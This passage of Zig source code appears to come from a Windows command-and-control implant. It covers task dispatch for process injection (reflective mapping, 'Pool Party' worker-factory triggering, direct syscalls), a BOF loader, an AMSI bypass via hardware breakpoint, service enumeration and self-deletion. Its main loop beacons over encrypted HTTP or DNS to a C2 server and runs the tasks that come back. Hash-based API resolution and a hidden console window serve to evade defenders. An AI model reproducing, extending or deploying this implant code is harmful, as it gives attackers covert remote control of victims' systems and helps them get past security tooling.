        if (std.mem.eql(u8, technique, "reflective_poolstomp")) {
            // 1. Map self image reflectively (No shellcode/network)
            const remote_entry = injection.manualMap(arena, logToFile, hProcess, nt_create_section_ssn, nt_map_view_of_section_ssn, nt_duplicate_object_ssn, nt_write_ssn, syscalls.syscall_gadget) catch |err| {
                sendResult(task.id, std.fmt.allocPrint(arena, "Error: manualMap (reflective_poolstomp) failed: {s}", .{@errorName(err)}) catch "Failed", arena);
                return;
            };

            // 2. Trigger via Pool Party instead of Thread
            const poolparty = @import("poolparty.zig");
            const wf = poolparty.findWorkerFactory(arena, logToFile, target_pid, hProcess, nt_query_system_information_ssn, nt_duplicate_object_ssn, nt_query_object_ssn, nt_query_information_worker_factory_ssn, syscalls.syscall_gadget) catch |err| {
                sendResult(task.id, std.fmt.allocPrint(arena, "Error: reflective_poolstomp failed to find factory: {s}", .{@errorName(err)}) catch "Failed", arena);
                return;
            };

            _ = poolparty.triggerPoolParty(arena, logToFile, hProcess, wf.hDupFactory, wf.start_routine, wf.min_threads, remote_entry, nt_protect_ssn, nt_write_ssn, nt_set_information_worker_factory_ssn, syscalls.syscall_gadget) catch |err| {
                sendResult(task.id, std.fmt.allocPrint(arena, "Error: reflective_poolstomp trigger failed: {s}", .{@errorName(err)}) catch "Failed", arena);
                return;
            };

            sendResult(task.id, "Migration initiated via [reflective_poolstomp].", arena);
            return;
        } else {
            // Default: reflective
            remote_exec_addr = injection.manualMap(arena, logToFile, hProcess, nt_create_section_ssn, nt_map_view_of_section_ssn, nt_duplicate_object_ssn, nt_write_ssn, syscalls.syscall_gadget) catch |err| {
                sendResult(task.id, std.fmt.allocPrint(arena, "Error: manualMap (reflective) failed: {s}", .{@errorName(err)}) catch "Failed", arena);
                return;
            };

            // Thread Spawn
            Sleep(500);
            var hThread: ?*anyopaque = null;
            const t_args = [_]usize{ @intFromPtr(&hThread), 0x1FFFFF, 0, @intFromPtr(hProcess), remote_exec_addr, 0, 0, 0, 0, 0, 0 };
            _ = syscalls.doSyscall(nt_create_thread_ex_ssn, syscalls.syscall_gadget, &t_args);

            if (hThread != null) _ = CloseHandle_(hThread);
            sendResult(task.id, std.fmt.allocPrint(arena, "Migration successful via [reflective] at 0x{x}", .{remote_exec_addr}) catch "Success", arena);
        }
    } else if (std.mem.eql(u8, cmd, "bof")) {
        logToFile(arena, "Flow: Executing BOF...");
        var it_bof = std.mem.tokenizeAny(u8, args, " ");
        const b64_coff = it_bof.next() orelse {
            sendResult(task.id, "Usage: bof <b64_coff> [b64_args]", arena);
            return;
        };
        const b64_args = it_bof.next();

        const coff_size = std.base64.standard.Decoder.calcSizeForSlice(b64_coff) catch {
            sendResult(task.id, "Invalid BOF base64", arena);
            return;
        };
        const coff_data = arena.alloc(u8, coff_size) catch return;
        _ = std.base64.standard.Decoder.decode(coff_data, b64_coff) catch {
            sendResult(task.id, "BOF decode failed", arena);
            return;
        };

        var bof_args: []u8 = &[_]u8{};
        if (b64_args) |ba| {
            const args_size = std.base64.standard.Decoder.calcSizeForSlice(ba) catch 0;
            if (args_size > 0) {
                bof_args = arena.alloc(u8, args_size) catch &[_]u8{};
                _ = std.base64.standard.Decoder.decode(bof_args, ba) catch { bof_args = &[_]u8{}; };
            }
        }

        var loader = bof.BofLoader{
            .arena = arena,
            .log = logToFile,
        };

        const output = loader.loadAndRun(coff_data, bof_args) catch |err| {
            const err_msg = std.fmt.allocPrint(arena, "BOF failed: {s}", .{@errorName(err)}) catch "BOF failed";
            sendResult(task.id, err_msg, arena);
            return;
        };

        sendResult(task.id, output, arena);
    } else if (std.mem.eql(u8, cmd, "amsi")) {

        const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
        const k32_base = api.getModuleHandleByHash(k32_hash) orelse return;
        const LoadLibraryA_ = @as(api.LoadLibraryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("LoadLibraryA")) orelse return));
        
        const amsi_base = LoadLibraryA_("amsi.dll") orelse {
            sendResult(task.id, "Failed to load amsi.dll", arena);
            return;
        };

        const target = @intFromPtr(api.getProcAddressByHash(amsi_base, comptime crypto.djb2("AmsiScanBuffer")) orelse {
            sendResult(task.id, "Failed to resolve AmsiScanBuffer", arena);
            return;
        });

        amsi_target = target;
        _ = AddVectoredExceptionHandler(1, veh);
        RaiseException(GHOST_EXCEPTION, 0, 0, null);
        
        sendResult(task.id, "AMSI bypass enabled via Hardware Breakpoint", arena);
    } else if (std.mem.eql(u8, cmd, "pid")) {
        const pid = GetCurrentProcessId();
        const msg = std.fmt.allocPrint(arena, "PID: {d}", .{pid}) catch "Error";
        sendResult(task.id, msg, arena);
    } else if (std.mem.eql(u8, cmd, "sc_enum")) {
        const hScm = OpenSCManagerA(null, null, api.SC_MANAGER_CONNECT | api.SC_MANAGER_ENUMERATE_SERVICE);
        if (hScm == null) {
            sendResult(task.id, "Failed to open SCM", arena);
            return;
        }
        defer _ = CloseServiceHandle(hScm);

        var bytes_needed: u32 = 0;
        var services_returned: u32 = 0;
        var resume_handle: u32 = 0;

        // First call to get size
        _ = EnumServicesStatusExA(hScm, 0, api.SERVICE_WIN32, api.SERVICE_STATE_ALL, null, 0, &bytes_needed, &services_returned, &resume_handle, null);

        if (bytes_needed == 0) {
            sendResult(task.id, "No services found or error getting size", arena);
            return;
        }

        const buffer = arena.alloc(u8, bytes_needed) catch {
            sendResult(task.id, "OOM", arena);
            return;
        };

        if (EnumServicesStatusExA(hScm, 0, api.SERVICE_WIN32, api.SERVICE_STATE_ALL, buffer.ptr, bytes_needed, &bytes_needed, &services_returned, &resume_handle, null) != 0) {
            const services = @as([*]api.ENUM_SERVICE_STATUS_PROCESSA, @ptrCast(@alignCast(buffer.ptr)));
            var output = std.ArrayListUnmanaged(u8).empty;
            output.appendSlice(arena, "Status | PID | Name | Display Name\n") catch return;
            output.appendSlice(arena, "------ | --- | ---- | ------------\n") catch return;

            var i: u32 = 0;
            while (i < services_returned) : (i += 1) {
                const s = services[i];
                const s_name = if (s.lpServiceName) |ptr| std.mem.span(@as([*:0]u8, @ptrCast(ptr))) else "unknown";
                const d_name = if (s.lpDisplayName) |ptr| std.mem.span(@as([*:0]u8, @ptrCast(ptr))) else "unknown";
                const status = switch (s.ServiceStatusProcess.dwCurrentState) {
                    1 => "STOPPED",
                    2 => "STARTING",
                    3 => "STOPPING",
                    4 => "RUNNING",
                    else => "OTHER",
                };

                const line = std.fmt.allocPrint(arena, "{s} | {d} | {s} | {s}\n", .{
                    status,
                    s.ServiceStatusProcess.dwProcessId,
                    s_name,
                    d_name,
                }) catch break;
                output.appendSlice(arena, line) catch break;
            }
            sendResult(task.id, output.items, arena);
        } else {
            sendResult(task.id, "EnumServicesStatusExA failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "sc_query")) {
        if (args.len == 0) {
            sendResult(task.id, "Usage: sc_query <service_name>", arena);
            return;
        }
        const service_name_z = arena.dupeZ(u8, args) catch return;

        const hScm = OpenSCManagerA(null, null, api.SC_MANAGER_CONNECT);
        if (hScm == null) {
            sendResult(task.id, "Failed to open SCM", arena);
            return;
        }
        defer _ = CloseServiceHandle(hScm);

        const hService = OpenServiceA(hScm, service_name_z, api.SERVICE_QUERY_CONFIG);
        if (hService == null) {
            sendResult(task.id, "Failed to open service", arena);
            return;
        }
        defer _ = CloseServiceHandle(hService);

        var bytes_needed: u32 = 0;
        _ = QueryServiceConfigA(hService, null, 0, &bytes_needed);

        if (bytes_needed == 0) {
            sendResult(task.id, "Failed to get config size", arena);
            return;
        }

        const buffer = arena.alloc(u8, bytes_needed) catch return;
        const config = @as(*api.QUERY_SERVICE_CONFIGA, @ptrCast(@alignCast(buffer.ptr)));

        if (QueryServiceConfigA(hService, config, bytes_needed, &bytes_needed) != 0) {
            const bin_path = if (config.lpBinaryPathName) |ptr| std.mem.span(@as([*:0]u8, @ptrCast(ptr))) else "none";
            const start_name = if (config.lpServiceStartName) |ptr| std.mem.span(@as([*:0]u8, @ptrCast(ptr))) else "none";
            const display_name = if (config.lpDisplayName) |ptr| std.mem.span(@as([*:0]u8, @ptrCast(ptr))) else "none";

            const start_type = switch (config.dwStartType) {
                0 => "BOOT_START",
                1 => "SYSTEM_START",
                2 => "AUTO_START",
                3 => "DEMAND_START",
                4 => "DISABLED",
                else => "UNKNOWN",
            };

            const result = std.fmt.allocPrint(arena, 
                "Service: {s}\nDisplay: {s}\nType: 0x{x}\nStart: {s}\nBinary: {s}\nAccount: {s}",
                .{ args, display_name, config.dwServiceType, start_type, bin_path, start_name }
            ) catch "OOM";
            sendResult(task.id, result, arena);
        } else {
            sendResult(task.id, "QueryServiceConfigA failed", arena);
        }
    } else if (std.mem.eql(u8, cmd, "self_destruct")) {
        var path: [api.MAX_PATH]u8 = undefined;
        const len = GetModuleFileNameA(null, &path, api.MAX_PATH);
        if (len > 0) {
            const self_path = path[0..len];
            const del_cmd = std.fmt.allocPrint(arena, "ping 127.0.0.1 -n 3 > nul & del /f /q \"{s}\"", .{self_path}) catch "exit";
            sendResult(task.id, "Self-destructing...", arena);
            Sleep(1000);
            runShellDetached(del_cmd);
            ExitProcess(0);
        } else {
            sendResult(task.id, "Failed to get self path", arena);
        }
    } else {
        sendResult(task.id, "Unknown command", arena);
    }
}

fn sendResult(task_id: []const u8, output: []const u8, arena: std.mem.Allocator) void {
    logToFile(arena, "Flow: sendResult entered.");
    
    // MANUAL JSON CONSTRUCTION (No std.json.fmt dependency for maximum stability)
    const escaped_output = jsonEscape(arena, output);
    const json_buf = std.fmt.allocPrint(arena, "{{\"task_id\":\"{s}\",\"output\":\"{s}\"}}", .{task_id, escaped_output}) catch {
        logToFile(arena, "Flow: Manual JSON construction failed.");
        return;
    };

    const json_enc = arena.dupe(u8, json_buf) catch return;
    crypto.rc4(json_enc, &session_key);
    
    logToFile(arena, "Flow: Payload encrypted, sending...");
    _ = current_transport.send("/result", json_enc) catch |err| {
        const err_msg = std.fmt.allocPrint(arena, "Flow: Send failed: {s}", .{@errorName(err)}) catch "Flow: Send failed";
        logToFile(arena, err_msg);
    };
    logToFile(arena, "Flow: Send sequence finished.");
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    
    var start_arena = std.heap.ArenaAllocator.init(allocator);
    defer start_arena.deinit();
    const sa = start_arena.allocator();

    crypto.hexToBytes(&session_key, build_options.c2_key);

    const k32_hash = comptime crypto.djb2_i("KERNEL32.DLL");
    const k32_base = api.getModuleHandleByHash(k32_hash) orelse return;
    
    // Resolve basic APIs needed for logging immediately
    GetModuleFileNameA   = @as(GetModuleFileNameAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetModuleFileNameA")) orelse return));
    CreateFileA          = @as(CreateFileAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateFileA")) orelse return));
    WriteFile            = @as(WriteFileFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("WriteFile")) orelse return));
    CloseHandle          = @as(CloseHandleFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CloseHandle")) orelse return));
    ReadFile             = @as(ReadFileFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("ReadFile")) orelse return));
    WaitForSingleObject  = @as(WaitForSingleObjectFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("WaitForSingleObject")) orelse return));
    SetFilePointer       = @as(SetFilePointerFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("SetFilePointer")) orelse return));
    Sleep                = @as(SleepFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("Sleep")) orelse return));
    GetLocalTime         = @as(GetLocalTimeFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetLocalTime")) orelse return));
    GetTempPathA         = @as(GetTempPathAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetTempPathA")) orelse return));

    logToFile(sa, "Agent starting up...");

    const LoadLibraryA = @as(api.LoadLibraryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("LoadLibraryA")) orelse return));
    GetCurrentProcessId  = @as(GetCurrentProcessIdFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetCurrentProcessId")) orelse return));
    GetCurrentThreadId   = @as(GetCurrentThreadIdFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetCurrentThreadId")) orelse return));
    GetComputerNameW     = @as(GetComputerNameWFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetComputerNameW")) orelse return));
    CreateProcessW       = @as(CreateProcessWFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateProcessW")) orelse return));
    GetCurrentDirectoryA = @as(GetCurrentDirectoryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetCurrentDirectoryA")) orelse return));
    SetCurrentDirectoryA = @as(SetCurrentDirectoryAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("SetCurrentDirectoryA")) orelse return));
    FindFirstFileA       = @as(FindFirstFileAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("FindFirstFileA")) orelse return));
    FindNextFileA        = @as(FindNextFileAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("FindNextFileA")) orelse return));
    FindClose            = @as(FindCloseFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("FindClose")) orelse return));
    GetFileSize          = @as(GetFileSizeFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetFileSize")) orelse return));
    DeleteFileA          = @as(DeleteFileAFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("DeleteFileA")) orelse return));
    ExitProcess          = @as(ExitProcessFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("ExitProcess")) orelse return));
    CreateToolhelp32Snapshot = @as(CreateToolhelp32SnapshotFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateToolhelp32Snapshot")) orelse return));
    Process32First       = @as(Process32FirstFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("Process32First")) orelse return));
    Process32Next        = @as(Process32NextFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("Process32Next")) orelse return));
    IsWow64Process       = @as(api.IsWow64ProcessFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("IsWow64Process")) orelse return));
    AddVectoredExceptionHandler = @as(AddVectoredExceptionHandlerFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("AddVectoredExceptionHandler")) orelse return));
    RaiseException       = @as(RaiseExceptionFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("RaiseException")) orelse return));
    VirtualQuery         = @as(VirtualQueryFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("VirtualQuery")) orelse return));
    VirtualProtect       = @as(VirtualProtectFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("VirtualProtect")) orelse return));
    CreateEventW         = @as(CreateEventWFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateEventW")) orelse return));
    SetEvent             = @as(SetEventFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("SetEvent")) orelse return));
    CreateTimerQueue     = @as(CreateTimerQueueFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateTimerQueue")) orelse return));
    CreateTimerQueueTimer = @as(CreateTimerQueueTimerFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("CreateTimerQueueTimer")) orelse return));
    DeleteTimerQueue     = @as(DeleteTimerQueueFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("DeleteTimerQueue")) orelse return));
    SetFilePointer       = @as(SetFilePointerFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("SetFilePointer")) orelse return));

    const ntdll_base = api.getModuleHandleByHash(comptime crypto.djb2_i("NTDLL.DLL")) orelse return;
    RtlCaptureContext    = @as(RtlCaptureContextFn, @ptrCast(api.getProcAddressByHash(ntdll_base, comptime crypto.djb2("RtlCaptureContext")) orelse return));
    NtContinue           = @as(NtContinueFn, @ptrCast(api.getProcAddressByHash(ntdll_base, comptime crypto.djb2("NtContinue")) orelse return));
    RtlExitUserThread    = @as(api.RtlExitUserThreadFn, @ptrCast(api.getProcAddressByHash(ntdll_base, comptime crypto.djb2("RtlExitUserThread")) orelse return));

    nt_protect_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtProtectVirtualMemory")) catch 0;
    nt_allocate_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtAllocateVirtualMemory")) catch 0;
    nt_write_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtWriteVirtualMemory")) catch 0;
    nt_create_user_process_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtCreateUserProcess")) catch 0;
    nt_queue_apc_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtQueueApcThread")) catch 0;
    nt_resume_thread_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtResumeThread")) catch 0;
    nt_create_section_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtCreateSection")) catch 0;
    nt_map_view_of_section_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtMapViewOfSection")) catch 0;
    nt_duplicate_object_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtDuplicateObject")) catch 0;
    nt_create_thread_ex_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtCreateThreadEx")) catch 0;
    nt_query_system_information_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtQuerySystemInformation")) catch 0;
    nt_query_object_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtQueryObject")) catch 0;
    nt_query_information_worker_factory_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtQueryInformationWorkerFactory")) catch 0;
    nt_set_information_worker_factory_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtSetInformationWorkerFactory")) catch 0;
    nt_query_information_process_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtQueryInformationProcess")) catch 0;
    nt_read_virtual_memory_ssn = syscalls.getSsn(ntdll_base, comptime crypto.djb2("NtReadVirtualMemory")) catch 0;

    syscalls.syscall_gadget = syscalls.findSyscallGadget(ntdll_base) catch 0;

    const advapi32_base = LoadLibraryA("advapi32.dll") orelse return;
    GetUserNameW = @as(GetUserNameWFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("GetUserNameW")) orelse return));
    SystemFunction032    = @as(SystemFunction032Fn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("SystemFunction032")) orelse return));
    OpenSCManagerA       = @as(api.OpenSCManagerAFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("OpenSCManagerA")) orelse return));
    OpenServiceA         = @as(api.OpenServiceAFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("OpenServiceA")) orelse return));
    EnumServicesStatusExA = @as(api.EnumServicesStatusExAFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("EnumServicesStatusExA")) orelse return));
    QueryServiceConfigA  = @as(api.QueryServiceConfigAFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("QueryServiceConfigA")) orelse return));
    CloseServiceHandle   = @as(api.CloseServiceHandleFn, @ptrCast(api.getProcAddressByHash(advapi32_base, comptime crypto.djb2("CloseServiceHandle")) orelse return));

    const iphlpapi_base = LoadLibraryA("iphlpapi.dll") orelse return;
    GetAdaptersInfo      = @as(GetAdaptersInfoFn, @ptrCast(api.getProcAddressByHash(iphlpapi_base, comptime crypto.djb2("GetAdaptersInfo")) orelse return));

    const user32_base = LoadLibraryA("user32.dll") orelse return;
    const GetConsoleWindow = @as(GetConsoleWindowFn, @ptrCast(api.getProcAddressByHash(k32_base, comptime crypto.djb2("GetConsoleWindow")) orelse return));
    const ShowWindow = @as(ShowWindowFn, @ptrCast(api.getProcAddressByHash(user32_base, comptime crypto.djb2("ShowWindow")) orelse return));

    // Hide console window immediately
    if (GetConsoleWindow()) |hWnd| {
        _ = ShowWindow(hWnd, SW_HIDE);
    }

    current_sleep = build_options.c2_sleep;
    current_jitter = build_options.c2_jitter;

    // Initialize transport based on build options
    if (std.mem.eql(u8, build_options.c2_transport, "dns")) {
        const t = try DnsTransport.init(allocator);
        current_transport = t.transport();
    } else {
        // Default to HTTP
        const t = try HttpTransport.init(allocator);
        current_transport = t.transport();
    }

    // SAFE STARTUP: Wait for OS threads to stabilize.
    Sleep(2000);

    var jitter_seed: u64 = GetCurrentProcessId();
    while (true) {
        const sleep_ms: u32 = current_sleep * 1000;
        const total_sleep = jitteredSleepMs(sleep_ms, current_jitter, &jitter_seed);
        
        var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
        defer arena.deinit();
        const aa = arena.allocator();
        
        // STANDARD SLEEP RESTORED FOR STABILITY
        Sleep(total_sleep);

        const checkin_payload_raw = buildCheckinPayload(aa);
        const checkin_payload = aa.dupe(u8, checkin_payload_raw) catch continue;
        crypto.rc4(checkin_payload, &session_key);

        logToFile(aa, "Performing checkin...");
        logToFile(aa, "Flow: transport.send initiated...");
        current_transport.send("/checkin", checkin_payload) catch |err| {
            const msg = std.fmt.allocPrint(aa, "Error: transport.send failed: {any}", .{err}) catch "send failed";
            logToFile(aa, msg);
            continue;
        };
        
        logToFile(aa, "Flow: transport.receive initiated...");
        const response = current_transport.receive(aa) catch |err| {
            const msg = std.fmt.allocPrint(aa, "Error: transport.receive failed: {any}", .{err}) catch "receive failed";
            logToFile(aa, msg);
            continue;
        };
        logToFile(aa, "Flow: checkin successful, processing tasks...");
        if (response.len == 0) continue;
        
        crypto.rc4(response, &session_key);
        const parsed = std.json.parseFromSlice(CheckinResponse, aa, response, .{ .ignore_unknown_fields = true }) catch {
             logToFile(aa, "Failed to parse checkin response.");
             continue;
        };

        for (parsed.value.tasks) |task| {
            dispatchTask(task, aa);
        }
    }
}
